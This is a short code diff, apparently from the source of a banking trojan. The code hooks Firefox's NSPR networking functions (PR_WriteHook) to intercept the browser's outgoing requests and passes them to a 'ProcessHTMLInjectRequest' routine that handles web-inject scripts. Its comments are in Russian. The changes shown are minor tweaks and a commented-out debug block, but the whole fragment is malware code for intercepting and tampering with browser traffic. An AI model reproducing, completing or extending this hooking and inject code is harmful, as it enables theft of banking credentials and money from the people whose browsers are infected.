@@ -36,7 +36,7 @@
 
 
 
-#include "BotDebug.h"
+//#include "BotDebug.h"
 
 // Зарезервируем имя для объявления функций nspr4 апи
 #define NSPRAPI
@@ -521,7 +521,7 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len, bool &CancelRequest )
 		if (Request->URL == NULL) return false;
 
 		// Обрабатываем взаимодействие со скриптами инжектов
-		ProcessHTMLInjectRequest(Request->URL, &CancelRequest);
+		ProcessHTMLInjectRequest(Request->URL, true, &CancelRequest);
 		if (CancelRequest) return false;
 
 
@@ -806,6 +806,12 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 
 	bool CancelRequest = false;
 	PCHAR PBuf = (PCHAR)buf;
+
+//	if (PBuf && *PBuf == 'G')
+//	if (STRA::Pos(PBuf, "1txt") >= 0)
+//	{
+//        PBuf = PBuf;
+//    }
 
 	PRequest Request = Request::Find(FFRequests, fd);
 	if ( Request != NULL )
